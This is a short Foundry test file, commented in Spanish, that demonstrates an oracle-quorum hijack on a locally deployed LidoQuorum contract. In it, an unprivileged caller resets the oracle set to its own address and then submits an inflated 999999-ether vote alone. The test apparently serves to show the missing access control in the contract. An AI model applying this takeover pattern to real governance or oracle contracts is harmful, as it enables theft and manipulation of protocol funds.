// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Lido_Core/LidoQuorum.sol";

contract LidoHijackTest is Test {
    LidoQuorum quorum;

    function setUp() public {
        address[] memory initialOracles = new address[](1);
        initialOracles[0] = address(0xDE0); // El oraculo real
        quorum = new LidoQuorum(initialOracles);
    }

    function testProtocolHijack() public {
        // 1. Un atacante anonimo resetea el quorum
        address[] memory hackerOracles = new address[](1);
        hackerOracles[0] = address(0xBEEF); // La direccion del Bunker
        
        quorum.resetQuorum(hackerOracles);
        
        emit log("ESTADO: Oraculos originales ELIMINADOS.");
        emit log("ESTADO: El Bunker (0xBEEF) es ahora el UNICO oraculo.");
        
        // 2. El hacker ahora vota lo que quiera solo
        vm.prank(address(0xBEEF));
        quorum.submitVote(1, 999999 ether);
        
        emit log_named_uint("Nuevo balance dictatorial", quorum.votes(1) / 1e18);
    }
}
